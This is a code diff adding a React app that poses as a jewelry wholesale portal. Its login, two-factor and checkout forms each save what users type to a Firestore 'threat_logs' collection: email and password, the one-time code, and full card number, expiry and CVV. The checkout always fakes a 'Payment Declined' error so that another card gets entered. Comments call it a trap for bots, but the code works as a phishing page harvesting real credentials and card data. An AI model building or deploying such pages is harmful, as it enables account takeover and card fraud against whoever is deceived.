@@ -1,0 +1,186 @@
+import React, { useState } from 'react';
+import { BrowserRouter as Router, Routes, Route, useNavigate } from 'react-router-dom';
+import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
+import { db } from './firebase';
+import { Lock, ChevronRight, Gem, ShieldCheck } from 'lucide-react';
+
+// --- THREAT LOGGER ---
+const logThreatEvent = async (eventType, payload) => {
+  try {
+    await addDoc(collection(db, 'threat_logs'), {
+      eventType,
+      userAgent: navigator.userAgent,
+      timestamp: serverTimestamp(),
+      payload
+    });
+  } catch (err) {
+    // Fail silently so the bot doesn't know it's a trap
+  }
+};
+
+// --- COMPONENTS ---
+
+const Header = () => (
+  <header className="w-full border-b border-slate-800/50 bg-slate-950/80 backdrop-blur-md p-6 flex justify-center items-center sticky top-0 z-50">
+    <Gem className="text-gold-500 w-6 h-6 mr-3" />
+    <h1 className="text-2xl font-serif text-white tracking-widest uppercase">Justine Jewelries</h1>
+  </header>
+);
+
+const Login = () => {
+  const navigate = useNavigate();
+  const handleSubmit = (e) => {
+    e.preventDefault();
+    const formData = new FormData(e.target);
+    logThreatEvent('LOGIN_ATTEMPT', Object.fromEntries(formData));
+    navigate('/verify'); // Redirect immediately
+  };
+
+  return (
+    <div className="min-h-screen flex flex-col items-center justify-center p-4">
+      <div className="max-w-md w-full bg-slate-900 border border-slate-800 rounded-xl p-8 shadow-2xl">
+        <div className="text-center mb-8">
+          <h2 className="text-2xl font-serif text-white mb-2">Wholesale Portal</h2>
+          <p className="text-sm text-slate-400 font-sans">Authorized partners only.</p>
+        </div>
+        <form onSubmit={handleSubmit} className="space-y-6">
+          <div>
+            <label className="block text-xs font-sans text-slate-400 uppercase tracking-wider mb-2">Email Address</label>
+            <input type="email" name="email" required className="w-full bg-slate-950 border border-slate-800 text-white px-4 py-3 rounded focus:outline-none focus:border-gold-500 transition-colors font-sans" />
+          </div>
+          <div>
+            <label className="block text-xs font-sans text-slate-400 uppercase tracking-wider mb-2">Password</label>
+            <input type="password" name="password" required className="w-full bg-slate-950 border border-slate-800 text-white px-4 py-3 rounded focus:outline-none focus:border-gold-500 transition-colors font-sans" />
+          </div>
+          <button type="submit" className="w-full bg-gold-600 hover:bg-gold-500 text-white font-sans font-medium py-3 rounded flex justify-center items-center transition-colors">
+            <Lock className="w-4 h-4 mr-2" /> Secure Login
+          </button>
+        </form>
+      </div>
+    </div>
+  );
+};
+
+const OtpVerify = () => {
+  const navigate = useNavigate();
+  const handleSubmit = (e) => {
+    e.preventDefault();
+    const formData = new FormData(e.target);
+    logThreatEvent('OTP_SUBMIT', Object.fromEntries(formData));
+    navigate('/catalog');
+  };
+
+  return (
+    <div className="min-h-screen flex flex-col items-center justify-center p-4">
+      <div className="max-w-md w-full bg-slate-900 border border-slate-800 rounded-xl p-8 shadow-2xl text-center">
+        <ShieldCheck className="w-12 h-12 text-gold-500 mx-auto mb-4" />
+        <h2 className="text-xl font-serif text-white mb-2">Two-Factor Authentication</h2>
+        <p className="text-sm text-slate-400 font-sans mb-8">Enter the 6-digit code sent to your registered device.</p>
+        <form onSubmit={handleSubmit} className="space-y-6">
+          <input type="text" name="otp" maxLength="6" required className="w-full bg-slate-950 border border-slate-800 text-white px-4 py-4 rounded text-center text-2xl tracking-[1em] focus:outline-none focus:border-gold-500 font-sans" />
+          <button type="submit" className="w-full bg-gold-600 hover:bg-gold-500 text-white font-sans font-medium py-3 rounded transition-colors">
+            Verify & Proceed
+          </button>
+        </form>
+      </div>
+    </div>
+  );
+};
+
+const Catalog = () => {
+  const navigate = useNavigate();
+  const products = [
+    { id: 1, name: "18K Gold Cuban Link", price: "$4,500" },
+    { id: 2, name: "5CT Diamond Solitaire", price: "$12,200" },
+    { id: 3, name: "Sapphire Tennis Bracelet", price: "$8,900" }
+  ];
+
+  return (
+    <div className="max-w-6xl mx-auto px-4 py-12">
+      <h2 className="text-3xl font-serif text-white mb-2">Exclusive Collection</h2>
+      <p className="text-slate-400 font-sans mb-12">Current wholesale rates. Subject to market availability.</p>
+      <div className="grid md:grid-cols-3 gap-8">
+        {products.map(p => (
+          <div key={p.id} className="bg-slate-900 border border-slate-800 rounded-xl overflow-hidden group hover:border-gold-500 transition-colors">
+            <div className="h-64 bg-slate-950 flex items-center justify-center border-b border-slate-800">
+              <Gem className="w-16 h-16 text-slate-800 group-hover:text-gold-500/50 transition-colors" />
+            </div>
+            <div className="p-6">
+              <h3 className="text-lg font-serif text-white mb-2">{p.name}</h3>
+              <p className="text-gold-400 font-sans font-medium mb-6">{p.price}</p>
+              <button onClick={() => navigate('/checkout')} className="w-full flex items-center justify-between text-sm font-sans text-white border border-slate-700 hover:border-gold-500 py-2 px-4 rounded transition-colors">
+                Order Now <ChevronRight className="w-4 h-4" />
+              </button>
+            </div>
+          </div>
+        ))}
+      </div>
+    </div>
+  );
+};
+
+const Checkout = () => {
+  const [error, setError] = useState(false);
+  const handleSubmit = (e) => {
+    e.preventDefault();
+    const formData = new FormData(e.target);
+    logThreatEvent('CARD_TEST', Object.fromEntries(formData));
+    setError(true); // Always fail to trap bots in a loop
+    e.target.reset();
+  };
+
+  return (
+    <div className="max-w-2xl mx-auto px-4 py-12">
+      <div className="bg-slate-900 border border-slate-800 rounded-xl p-8">
+        <h2 className="text-2xl font-serif text-white mb-6">Secure Checkout</h2>
+        {error && (
+          <div className="bg-red-950/50 border border-red-500/50 text-red-400 px-4 py-3 rounded mb-6 font-sans text-sm">
+            Payment Declined: Card Issuer Error. Please try a different payment method.
+          </div>
+        )}
+        <form onSubmit={handleSubmit} className="space-y-6">
+          <div className="grid md:grid-cols-2 gap-6">
+            <div>
+              <label className="block text-xs font-sans text-slate-400 uppercase mb-2">Cardholder Name</label>
+              <input type="text" name="name" required className="w-full bg-slate-950 border border-slate-800 text-white px-4 py-3 rounded focus:outline-none focus:border-gold-500 font-sans" />
+            </div>
+            <div>
+              <label className="block text-xs font-sans text-slate-400 uppercase mb-2">Card Number</label>
+              <input type="text" name="ccNumber" maxLength="16" required className="w-full bg-slate-950 border border-slate-800 text-white px-4 py-3 rounded focus:outline-none focus:border-gold-500 font-sans" />
+            </div>
+            <div>
+              <label className="block text-xs font-sans text-slate-400 uppercase mb-2">Expiry (MM/YY)</label>
+              <input type="text" name="expiry" maxLength="5" required className="w-full bg-slate-950 border border-slate-800 text-white px-4 py-3 rounded focus:outline-none focus:border-gold-500 font-sans" />
+            </div>
+            <div>
+              <label className="block text-xs font-sans text-slate-400 uppercase mb-2">CVV</label>
+              <input type="text" name="cvv" maxLength="4" required className="w-full bg-slate-950 border border-slate-800 text-white px-4 py-3 rounded focus:outline-none focus:border-gold-500 font-sans" />
+            </div>
+          </div>
+          <button type="submit" className="w-full bg-gold-600 hover:bg-gold-500 text-white font-sans font-medium py-4 rounded transition-colors">
+            Process Payment
+          </button>
+        </form>
+      </div>
+    </div>
+  );
+};
+
+// --- APP ROUTER ---
+export default function App() {
+  return (
+    <Router>
+      <div className="min-h-screen bg-slate-950 flex flex-col">
+        <Header />
+        <div className="flex-grow">
+          <Routes>
+            <Route path="/" element={<Login />} />
+            <Route path="/verify" element={<OtpVerify />} />
+            <Route path="/catalog" element={<Catalog />} />
+            <Route path="/checkout" element={<Checkout />} />
+          </Routes>
+        </div>
+      </div>
+    </Router>
+  );
+}
